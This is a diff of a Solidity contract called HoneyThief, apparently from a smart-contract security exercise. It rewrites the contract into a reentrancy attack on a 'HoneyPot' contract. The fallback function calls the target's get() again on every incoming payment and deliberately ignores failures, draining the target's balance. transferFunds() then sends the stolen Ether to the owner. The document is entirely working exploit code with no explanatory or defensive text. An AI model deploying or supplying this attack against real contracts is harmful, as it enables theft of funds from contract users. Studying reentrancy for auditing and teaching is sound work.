@@ -1,29 +1,46 @@
-pragma solidity 0.4.24;
+pragma solidity ^0.5.0;
 
-contract HoneyThief {
+import '@openzeppelin/contracts/ownership/Ownable.sol';
+
+contract HoneyThief is Ownable {
     
-    address public honeyPot;
+    event LogFallback(address indexed sender, uint indexed value, uint newBalance);
 
-    event LogFallback(address indexed sender, uint indexed value, uint indexed newBalance);
-
-    constructor(address honeyPotAddress) public {
-        honeyPot = honeyPotAddress;
+    constructor() public {
     }
 
     function() external payable {
         emit LogFallback(msg.sender, msg.value, address(this).balance);
-        honeyPot.call(abi.encodeWithSignature("get()", ""));
+
+       (bool success, ) = msg.sender.call(abi.encodeWithSignature("get()", ""));
+
+        if(!success) {
+            //Eat the failure. Do not revert. 
+        }
+
     }
 
-    function put() public {
-       bool success = honeyPot.call.value(1 ether)(abi.encodeWithSignature("put()", ""));
-       require(success, "Call failed.");
+    function put(address honeyPotAddress) public payable onlyOwner {
+       HoneyPot honeyPot = HoneyPot(honeyPotAddress);
+       honeyPot.put.value(msg.value)();
     }
 
-    function get() public {
-        bool success = honeyPot.call(abi.encodeWithSignature("get()", ""));
-        require(success, "Call failed.");
+    function get(address honeyPotAddress) public onlyOwner {
+        HoneyPot honeyPot = HoneyPot(honeyPotAddress);
+        honeyPot.get();
     }
-    
 
+    function transferFunds() public onlyOwner {
+        (bool success, ) = msg.sender.call.value(address(this).balance)("");
+        require(success, "Transfer failed.");
+    }
+}
+
+contract HoneyPot {
+
+    function put() payable public {}
+
+    function get() public {}
+
+    function balances(address) public view returns (uint){}
 }
